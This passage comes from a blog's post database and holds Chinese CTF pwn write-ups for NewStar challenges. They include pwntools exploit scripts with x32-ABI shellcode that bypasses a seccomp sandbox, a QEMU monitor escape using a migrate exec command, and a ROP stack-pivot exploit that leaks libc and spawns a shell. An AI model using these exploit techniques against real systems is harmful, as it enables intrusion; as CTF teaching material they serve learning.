class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;cod3&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">26063</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># mov rax, 0x1111111111111111^0x67616c662f</span></span><br><span class=\"line\">    <span class=\"comment\"># push rax</span></span><br><span class=\"line\">    <span class=\"comment\"># mov rax, 0x1111111111111111</span></span><br><span class=\"line\">    <span class=\"comment\"># xor [rsp], rax</span></span><br><span class=\"line\">ru(<span class=\"string\">&quot;Show me your code:\\n&quot;</span>)</span><br><span class=\"line\">shellcode=asm(</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    mov rax, 0x67616c662f</span></span><br><span class=\"line\"><span class=\"string\">    push rax</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    push 0x40000002</span></span><br><span class=\"line\"><span class=\"string\">    pop rax</span></span><br><span class=\"line\"><span class=\"string\">    mov rdi, rsp</span></span><br><span class=\"line\"><span class=\"string\">    mov rdx, 0x440</span></span><br><span class=\"line\"><span class=\"string\">    xor rsi, rsi</span></span><br><span class=\"line\"><span class=\"string\">    syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    mov rdi, rax</span></span><br><span class=\"line\"><span class=\"string\">    sub rsp, rdx</span></span><br><span class=\"line\"><span class=\"string\">    mov rsi, rsp</span></span><br><span class=\"line\"><span class=\"string\">    xor rax, rax</span></span><br><span class=\"line\"><span class=\"string\">    syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    mov rdx, rax</span></span><br><span class=\"line\"><span class=\"string\">    push 0x2</span></span><br><span class=\"line\"><span class=\"string\">    pop rdi</span></span><br><span class=\"line\"><span class=\"string\">    push 0x1</span></span><br><span class=\"line\"><span class=\"string\">    pop rax</span></span><br><span class=\"line\"><span class=\"string\">    syscall </span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;length of shellcode: &#x27;</span>,<span class=\"built_in\">len</span>(shellcode))</span><br><span class=\"line\">s(shellcode)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>NewStar CTF Week5的题，用x32 ABI绕过沙箱</p>","more":"<p>查壳，保护全开</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/CtfGame/NewStar/code_me_plz/cod3&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n\n<p>程序比较简单</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __noreturn <span class=\"title function_\">vuln</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Show me your code:&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, zone, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">  close(<span class=\"number\">1</span>);</span><br><span class=\"line\">  ((<span class=\"type\">void</span> (*)(<span class=\"type\">void</span>))zone)();</span><br><span class=\"line\">  _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>会直接执行我们输入的内容，因此我们需要写一段shellcode来完成我们的工作。</p>\n<p>开了沙箱</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class=\"built_in\">arch</span></span><br><span class=\"line\"> 0001: 0x15 0x00 0x08 0xc000003e  <span class=\"keyword\">if</span> (A != ARCH_X86_64) goto 0010</span><br><span class=\"line\"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class=\"line\"> 0003: 0x35 0x05 0x00 0x40000000  <span class=\"keyword\">if</span> (A &gt;= 0x40000000) goto 0009 <span class=\"comment\"># 允许sys_number&gt;=0x40000000</span></span><br><span class=\"line\"> 0004: 0x15 0x04 0x00 0x00000000  <span class=\"keyword\">if</span> (A == <span class=\"built_in\">read</span>) goto 0009</span><br><span class=\"line\"> 0005: 0x15 0x03 0x00 0x00000001  <span class=\"keyword\">if</span> (A == write) goto 0009</span><br><span class=\"line\"> 0006: 0x15 0x02 0x00 0x00000003  <span class=\"keyword\">if</span> (A == close) goto 0009</span><br><span class=\"line\"> 0007: 0x15 0x01 0x00 0x0000000c  <span class=\"keyword\">if</span> (A == brk) goto 0009</span><br><span class=\"line\"> 0008: 0x15 0x00 0x01 0x000000e7  <span class=\"keyword\">if</span> (A != exit_group) goto 0010</span><br><span class=\"line\"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class=\"built_in\">return</span> ALLOW</span><br><span class=\"line\"> 0010: 0x06 0x00 0x00 0x00000000  <span class=\"built_in\">return</span> KILL</span><br></pre></td></tr></table></figure>\n\n<p>看起来只允许<code>read</code>、<code>write</code>、<code>close</code>、<code>brk</code>和<code>exit_group</code>，其他的都不可以，这不但让我们不能走<code>execve</code>，并且还凑不齐<code>orw</code>。</p>\n<p>但在<code>0003</code>可以看到<code>if (A &gt;= 0x40000000) goto 0009</code>，这意味着我们可以使用<code>sys_number&gt;=0x40000000</code>的指令，而这些指令都是32位程序的接口，64位系统为了支持32位系统，保留了这些接口。</p>\n<p>x32 ABI与64位下的系统调用方法几乎无异，只不过系统调用号都是不小于0x40000000，并且要求使用32位指针。</p>\n<p>具体的调用表可以查看系统头文件中的<code>/usr/src/linux-headers-$version-generic/arch/x86/include/generated/uapi/asm/unistd_x32.h</code>，大致如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// #define __X32_SYSCALL_BIT\t0x40000000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> _UAPI_ASM_UNISTD_X32_H</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _UAPI_ASM_UNISTD_X32_H</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __NR_read (__X32_SYSCALL_BIT + 0)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __NR_write (__X32_SYSCALL_BIT + 1)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __NR_open (__X32_SYSCALL_BIT + 2)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __NR_close (__X32_SYSCALL_BIT + 3)</span></span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">/* _UAPI_ASM_UNISTD_X32_H */</span></span></span><br></pre></td></tr></table></figure>\n\n<p>因此这里我们就可以利用<code>0x40000002</code>的<code>open</code>来补上<code>orw</code>缺少的<code>open</code>。</p>\n<p><strong>小迷惑：shellcode明明可以直接将”/flag”入栈，为什么wp要那样处理一番来得到</strong></p>\n<p><strong>exp:</strong></p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;cod3&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">26063</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># mov rax, 0x1111111111111111^0x67616c662f</span></span><br><span class=\"line\">    <span class=\"comment\"># push rax</span></span><br><span class=\"line\">    <span class=\"comment\"># mov rax, 0x1111111111111111</span></span><br><span class=\"line\">    <span class=\"comment\"># xor [rsp], rax</span></span><br><span class=\"line\">ru(<span class=\"string\">&quot;Show me your code:\\n&quot;</span>)</span><br><span class=\"line\">shellcode=asm(</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    mov rax, 0x67616c662f</span></span><br><span class=\"line\"><span class=\"string\">    push rax</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    push 0x40000002</span></span><br><span class=\"line\"><span class=\"string\">    pop rax</span></span><br><span class=\"line\"><span class=\"string\">    mov rdi, rsp</span></span><br><span class=\"line\"><span class=\"string\">    mov rdx, 0x440</span></span><br><span class=\"line\"><span class=\"string\">    xor rsi, rsi</span></span><br><span class=\"line\"><span class=\"string\">    syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    mov rdi, rax</span></span><br><span class=\"line\"><span class=\"string\">    sub rsp, rdx</span></span><br><span class=\"line\"><span class=\"string\">    mov rsi, rsp</span></span><br><span class=\"line\"><span class=\"string\">    xor rax, rax</span></span><br><span class=\"line\"><span class=\"string\">    syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    mov rdx, rax</span></span><br><span class=\"line\"><span class=\"string\">    push 0x2</span></span><br><span class=\"line\"><span class=\"string\">    pop rdi</span></span><br><span class=\"line\"><span class=\"string\">    push 0x1</span></span><br><span class=\"line\"><span class=\"string\">    pop rax</span></span><br><span class=\"line\"><span class=\"string\">    syscall </span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;length of shellcode: &#x27;</span>,<span class=\"built_in\">len</span>(shellcode))</span><br><span class=\"line\">s(shellcode)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"FearWell","date":"2023-03-18T05:42:16.000Z","_content":"\nNewStar CTF 的kernel，预期解就是非预期解。\n\n<!--more-->\n\n启动脚本如下：\n\n```sh\n#!/bin/sh\n\nqemu-system-x86_64  \\\n-m 128M \\\n-kernel ./bzImage \\\n-initrd ./rootfs.cpio \\\n-cpu kvm64,+smep,+smap \\\n-append \"root=/dev/ram console=ttyS0 oops=panic quiet panic=1 kaslr\" \\\n-nographic \\\n-no-reboot \n\n```\n\n可以看到没有`-monitor`选项将监视器重定向到主机设备`/dev/null`，因此我们可以通过`ctrl a + c`进入`qemu`的`monitor`模式，之后通过`migrate \"exec: cat rootfs.cpio 1>&2\"`查看`rootfs.cpio`文件，在其中找`flag`。","source":"_posts/NewStar_Fearwell.md","raw":"---\ntitle: FearWell\ndate: 2023-03-18 13:42:16\ncategories: \n- pwn_wp\ntags: \n- pwn\n- kernel\n\n---\n\nNewStar CTF 的kernel，预期解就是非预期解。\n\n<!--more-->\n\n启动脚本如下：\n\n```sh\n#!/bin/sh\n\nqemu-system-x86_64  \\\n-m 128M \\\n-kernel ./bzImage \\\n-initrd ./rootfs.cpio \\\n-cpu kvm64,+smep,+smap \\\n-append \"root=/dev/ram console=ttyS0 oops=panic quiet panic=1 kaslr\" \\\n-nographic \\\n-no-reboot \n\n```\n\n可以看到没有`-monitor`选项将监视器重定向到主机设备`/dev/null`，因此我们可以通过`ctrl a + c`进入`qemu`的`monitor`模式，之后通过`migrate \"exec: cat rootfs.cpio 1>&2\"`查看`rootfs.cpio`文件，在其中找`flag`。","slug":"NewStar_Fearwell","published":1,"updated":"2023-03-23T13:14:02.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafg001l5oud6jcn6p25","content":"<p>NewStar CTF 的kernel，预期解就是非预期解。</p>\n<span id=\"more\"></span>\n\n<p>启动脚本如下：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"></span><br><span class=\"line\">qemu-system-x86_64  \\</span><br><span class=\"line\">-m 128M \\</span><br><span class=\"line\">-kernel ./bzImage \\</span><br><span class=\"line\">-initrd ./rootfs.cpio \\</span><br><span class=\"line\">-cpu kvm64,+smep,+smap \\</span><br><span class=\"line\">-append <span class=\"string\">&quot;root=/dev/ram console=ttyS0 oops=panic quiet panic=1 kaslr&quot;</span> \\</span><br><span class=\"line\">-nographic \\</span><br><span class=\"line\">-no-reboot </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>可以看到没有<code>-monitor</code>选项将监视器重定向到主机设备<code>/dev/null</code>，因此我们可以通过<code>ctrl a + c</code>进入<code>qemu</code>的<code>monitor</code>模式，之后通过<code>migrate &quot;exec: cat rootfs.cpio 1&gt;&amp;2&quot;</code>查看<code>rootfs.cpio</code>文件，在其中找<code>flag</code>。</p>\n","site":{"data":{}},"excerpt":"<p>NewStar CTF 的kernel，预期解就是非预期解。</p>","more":"<p>启动脚本如下：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"></span><br><span class=\"line\">qemu-system-x86_64  \\</span><br><span class=\"line\">-m 128M \\</span><br><span class=\"line\">-kernel ./bzImage \\</span><br><span class=\"line\">-initrd ./rootfs.cpio \\</span><br><span class=\"line\">-cpu kvm64,+smep,+smap \\</span><br><span class=\"line\">-append <span class=\"string\">&quot;root=/dev/ram console=ttyS0 oops=panic quiet panic=1 kaslr&quot;</span> \\</span><br><span class=\"line\">-nographic \\</span><br><span class=\"line\">-no-reboot </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>可以看到没有<code>-monitor</code>选项将监视器重定向到主机设备<code>/dev/null</code>，因此我们可以通过<code>ctrl a + c</code>进入<code>qemu</code>的<code>monitor</code>模式，之后通过<code>migrate &quot;exec: cat rootfs.cpio 1&gt;&amp;2&quot;</code>查看<code>rootfs.cpio</code>文件，在其中找<code>flag</code>。</p>"},{"title":"overflow_me_plz","date":"2023-03-19T01:33:11.000Z","_content":"\nNewStar CTF Week5的题，利用没开PIE的程序的代码片段，多次使用栈迁移。\n\n<!--more-->\n\n查壳，就开了NX\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/CtfGame/NewStar/overflow/pwn'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n逆向\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char buf[192]; // [rsp+0h] [rbp-C0h] BYREF\n\n  init(argc, argv, envp);\n  write(1, \"So this is not new and difficult for you anymore.\\n\", 0x33uLL);\n  write(1, \"Show me if you can pwn it!\\n\", 0x1CuLL);\n  read(0, buf, 0xD0uLL);\n  return 0;\n}\n```\n\n代码简单，是一个纯粹的栈溢出，只能溢出0x10，要通过栈迁移扩充空间，但我们没办法提前泄露栈地址，因此，我们只能迁移到bss段。\n\n通过栈溢出控制rbp后，利用read将数据读入到bss段。\n\n```asm\n.text:00000000004006D9 48 8D 85 40 FF FF FF          lea     rax, [rbp+buf]\t\t\t\t  ;buf=-0xc0\n.text:00000000004006E0 BA D0 00 00 00                mov     edx, 0D0h                       ; nbytes\n.text:00000000004006E5 48 89 C6                      mov     rsi, rax                        ; buf\n.text:00000000004006E8 BF 00 00 00 00                mov     edi, 0                          ; fd\n.text:00000000004006ED E8 3E FE FF FF                call    _read\n.text:00000000004006ED\n.text:00000000004006F2 B8 00 00 00 00                mov     eax, 0\n.text:00000000004006F7 C9                            leave\n.text:00000000004006F8 C3                            retn\n```\n\nread结束后，栈已经迁移到bss段上。在这次read写入的数据中布置好ROP链用于leak libc，并布置好rbp利用main的leave retn再次进行栈迁移，迁移到ROP链上。\n\n通过这次ROP可以leak libc，我们可以重复这个过程来get shell。\n\nexp:\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\nlibc=ELF('libc-2.31.so')\n# p=process('./'+filename)\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\np=remote('node4.buuoj.cn',26999)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \npop_rdi_ret=0x0000000000400763\npop_rsi_r15_ret=0x0000000000400761\npop_rbp_ret=0x00000000004005b8\npop_r12_r13_r14_r15_ret=0x000000000040075c\nleave_ret=0x00000000004006f7\nread_addr=0x00000000004006D9\nbss_addr=elf.bss()+0x200\n\nru(\"Show me if you can pwn it!\\n\")\npayload=b'a'*0xc0+p64(bss_addr)+p64(read_addr)\n\ns(payload)\n\n# start from bss_addr-0xc0\npayload=p64(pop_rdi_ret)+p64(1)\npayload+=p64(pop_rsi_r15_ret)+p64(elf.got['read'])+p64(0)\npayload+=p64(elf.sym['write']) # leak libc\npayload+=p64(pop_rbp_ret) # try again to get shell\npayload+=p64(bss_addr+0x200)\npayload+=p64(read_addr)\npayload=payload.ljust(0xc0,b'a')\npayload+=p64(bss_addr-0xc0-0x8)+p64(leave_ret) # move to bss_addr-0xc0\nleak('bss_addr',hex(bss_addr))\n\n# debug()\ns(payload)  \n\nread_addr=uu64(ru('\\x7f')[1:])\nlibcbase=read_addr-libc.sym['read']\nleak('read_addr',hex(read_addr))\nleak('libcbase',hex(libcbase))\n\none_gadget=libcbase+0xe3afe\n\nr()\n# start from bss_addr+0x200-0xc0\npayload=p64(pop_r12_r13_r14_r15_ret)+p64(0)*4\npayload+=p64(one_gadget)\npayload=payload.ljust(0xc0,b'b')\npayload+=p64(bss_addr+0x200-0xc0-0x8)+p64(leave_ret) # move to bss_addr+0x200-0xc0\ns(payload)\n\nitr()\n\n# 0xe3afe execve(\"/bin/sh\", r15, r12)\n# constraints:\n#   [r15] == NULL || r15 == NULL\n#   [r12] == NULL || r12 == NULL\n\n# 0xe3b01 execve(\"/bin/sh\", r15, rdx)\n# constraints:\n#   [r15] == NULL || r15 == NULL\n#   [rdx] == NULL || rdx == NULL\n\n# 0xe3b04 execve(\"/bin/sh\", rsi, rdx)\n# constraints:\n#   [rsi] == NULL || rsi == NULL\n#   [rdx] == NULL || rdx == NULL\n\n```\n\n","source":"_posts/NewStar-overflow_me_plz.md","raw":"---\ntitle: overflow_me_plz\ndate: 2023-03-19 09:33:11\ncategories: \n- pwn_wp\ntags: \n- pwn\n- ROP\n- 栈迁移\n\n\n---\n\nNewStar CTF Week5的题，利用没开PIE的程序的代码片段，多次使用栈迁移。\n\n<!--more-->\n\n查壳，就开了NX\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/CtfGame/NewStar/overflow/pwn'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n逆向\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char buf[192]; // [rsp+0h] [rbp-C0h] BYREF\n\n  init(argc, argv, envp);\n  write(1, \"So this is not new and difficult for you anymore.\\n\", 0x33uLL);\n  write(1, \"Show me if you can pwn it!\\n\", 0x1CuLL);\n  read(0, buf, 0xD0uLL);\n  return 0;\n}\n```\n\n代码简单，是一个纯粹的栈溢出，只能溢出0x10，要通过栈迁移扩充空间，但我们没办法提前泄露栈地址，因此，我们只能迁移到bss段。\n\n通过栈溢出控制rbp后，利用read将数据读入到bss段。\n\n```asm\n.text:00000000004006D9 48 8D 85 40 FF FF FF          lea     rax, [rbp+buf]\t\t\t\t  ;buf=-0xc0\n.text:00000000004006E0 BA D0 00 00 00                mov     edx, 0D0h                       ; nbytes\n.text:00000000004006E5 48 89 C6                      mov     rsi, rax                        ; buf\n.text:00000000004006E8 BF 00 00 00 00                mov     edi, 0                          ; fd\n.text:00000000004006ED E8 3E FE FF FF                call    _read\n.text:00000000004006ED\n.text:00000000004006F2 B8 00 00 00 00                mov     eax, 0\n.text:00000000004006F7 C9                            leave\n.text:00000000004006F8 C3                            retn\n```\n\nread结束后，栈已经迁移到bss段上。在这次read写入的数据中布置好ROP链用于leak libc，并布置好rbp利用main的leave 